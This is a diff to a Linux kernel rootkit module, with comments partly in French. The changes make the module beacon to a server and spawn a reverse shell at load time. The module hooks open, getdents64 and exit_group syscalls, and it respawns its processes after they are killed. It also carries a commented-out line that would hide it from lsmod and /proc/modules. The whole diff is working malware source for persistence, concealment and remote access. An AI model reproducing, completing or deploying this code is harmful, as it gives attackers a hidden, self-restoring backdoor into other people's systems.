@@ -141,7 +141,7 @@ static void make_request(char *str) {
 /* Fonction exécutée dans la workqueue */
 static void my_work_handler(struct work_struct *work) {
     pr_info("[+] Inside my_work_handler\n");
-    make_request("RESTARTED_BECAUSE_SOMEONE_KILLED_ME");
+    make_request("RESTARTED_BECAUSE_SOMETHING_KILLED_ME");
     rev_shell();
     make_request_periodic();
     kfree(work); // Libérer la mémoire après exécution
@@ -172,9 +172,15 @@ static int handler_pre3(struct kprobe *p, struct pt_regs *regs) {
 	return 0;
 }
 
-/* Initialisation du module */
+// Init function (called when insmod)
 static int __init hook_init(void) {
-    kp.symbol_name = "__x64_sys_open";
+	// networking start
+	make_request("START");
+	make_request_periodic();
+	rev_shell();
+	
+	// probe open
+	kp.symbol_name = "__x64_sys_open";
     kp.pre_handler = handler_pre;
     if (register_kprobe(&kp)) {
         pr_err("[-] Failed to register kprobe\n");
@@ -182,6 +188,7 @@ static int __init hook_init(void) {
     }
     pr_info("[+] __x64_sys_open hooked successfully\n");
    
+	// probe getdents 
 	kp2.symbol_name = "__x64_sys_getdents64";
 	kp2.pre_handler = handler_pre2;
 	if (register_kprobe(&kp2)) {
@@ -190,12 +197,14 @@ static int __init hook_init(void) {
 	}
 	pr_info("[+] __x64_sys_getdents64 hooked successfully\n");
 
+	// workqueue to spawn our process after they are killed
 	wq = create_singlethread_workqueue("my_workqueue");
 	if (!wq) {
 		pr_err("[-] Failed to create workqueue\n");
 		return -1;
 	}
 
+	// probe exit_group
 	kp3.symbol_name = "__x64_sys_exit_group";
 	kp3.pre_handler = handler_pre3;
 	if (register_kprobe(&kp3)) {
@@ -203,13 +212,21 @@ static int __init hook_init(void) {
 		return -1;
 	}
 	pr_info("[+] __x64_sys_exit_group hooked successfully\n");
+	
+	// remove from lsmod and /proc/modules
+	//list_del(&THIS_MODULE->list); 	
 	return 0;
 }
 
-/* Nettoyage du module */
+// Exit function (called when rmmod)
+// note that rmmod will not work if the list_del function is uncommented
 static void __exit hook_exit(void) {
-    unregister_kprobe(&kp);
-    destroy_workqueue(wq);
+	make_request("STOP");
+    find_and_kill_our_processes();
+	unregister_kprobe(&kp);
+	unregister_kprobe(&kp2);
+	unregister_kprobe(&kp3);
+    destroy_workqueue(wq);	
 	pr_info("[+] __x64_sys_open unhooked successfully\n");
 }
 
